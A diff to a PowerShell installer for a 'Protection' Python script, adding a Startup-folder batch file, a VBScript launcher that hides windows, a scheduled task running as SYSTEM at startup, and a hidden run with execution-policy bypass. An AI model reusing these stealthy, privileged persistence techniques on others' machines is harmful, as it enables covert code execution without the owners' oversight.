@@ -102,25 +102,32 @@ if ($scheduledTask) {
 # Get the path to Python executable
 $python_path = (Get-Command python).Definition
 
-# Define the action
-$batFilePath = "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protection.bat"
+# Define paths
+$batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\protection.bat"
 $pythonScriptPath = "C:\Users\Public\Other\Protection\protection.py"
+$vbsFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\protection.vbs"
 
-# Create the .bat file
-$batContent = "@echo off`npythonw `"$pythonScriptPath`""
+# Create the .bat file (executes Python script silently)
+$batContent = "@echo off`nstart /min pythonw `"$pythonScriptPath`""
 $batContent | Set-Content -Path $batFilePath -Encoding ASCII
 
-# Create a scheduled task to run at startup
-$taskName = "ProtectionService"
-$taskDescription = "Runs Protection script at startup"
+# Create a VBScript file to launch the BAT file without showing a window
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run ""$batFilePath"", 0, False
+"@
+$vbsContent | Set-Content -Path $vbsFilePath -Encoding ASCII
 
-$action = New-ScheduledTaskAction -Execute "$batFilePath"
+# Create a scheduled task to run at startup (uses the VBScript for silent execution)
+$taskName = "ProtectionService"
+$taskDescription = "Runs Protection script at startup silently"
+
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsFilePath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 
 Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
 
-# Run the PowerShell script immediately in the current session
+# Run the PowerShell script immediately in the current session (hidden)
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"C:\Users\Public\Other\Protection\run_protection.ps1`"" -WindowStyle Hidden
-
